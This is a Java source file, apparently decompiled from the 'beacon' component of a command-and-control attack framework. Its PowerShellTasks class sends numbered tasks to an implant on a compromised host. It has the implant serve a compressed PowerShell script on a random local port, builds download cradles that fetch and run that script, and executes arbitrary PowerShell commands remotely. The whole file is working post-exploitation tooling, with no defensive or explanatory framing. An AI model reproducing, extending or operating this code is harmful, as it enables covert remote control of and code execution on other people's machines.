package beacon;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.CommonUtils;
import common.PowerShellUtils;

public class PowerShellTasks {
   protected AggressorClient client;
   protected String bid;

   public PowerShellTasks(AggressorClient var1, String var2) {
      this.client = var1;
      this.bid = var2;
   }

   public String getScriptCradle(String var1) {
      String var2 = (new PowerShellUtils(this.client)).PowerShellCompress(CommonUtils.toBytes(var1));
      int var3 = CommonUtils.randomPortAbove1024();
      CommandBuilder var4 = new CommandBuilder();
      var4.setCommand(59);
      var4.addShort(var3);
      var4.addString(var2);
      byte[] var5 = var4.build();
      this.client.getConnection().call("beacons.task", CommonUtils.args(this.bid, var5));
      return (new PowerShellUtils(this.client)).PowerShellDownloadCradle("http://127.0.0.1:" + var3 + "/");
   }

   public String getImportCradle() {
      if (!DataUtils.hasImportedPowerShell(this.client.getData(), this.bid)) {
         return "";
      } else {
         int var1 = CommonUtils.randomPortAbove1024();
         CommandBuilder var2 = new CommandBuilder();
         var2.setCommand(79);
         var2.addShort(var1);
         this.client.getConnection().call("beacons.task", CommonUtils.args(this.bid, var2.build()));
         return (new PowerShellUtils(this.client)).PowerShellDownloadCradle("http://127.0.0.1:" + var1 + "/") + "; ";
      }
   }

   public void runCommand(String var1) {
      String var2 = (new PowerShellUtils(this.client)).format(var1, false);
      CommandBuilder var3 = new CommandBuilder();
      var3.setCommand(78);
      var3.addLengthAndString("");
      var3.addLengthAndString(var2);
      var3.addShort(1);
      byte[] var4 = var3.build();
      this.client.getConnection().call("beacons.task", CommonUtils.args(this.bid, var4));
   }
}
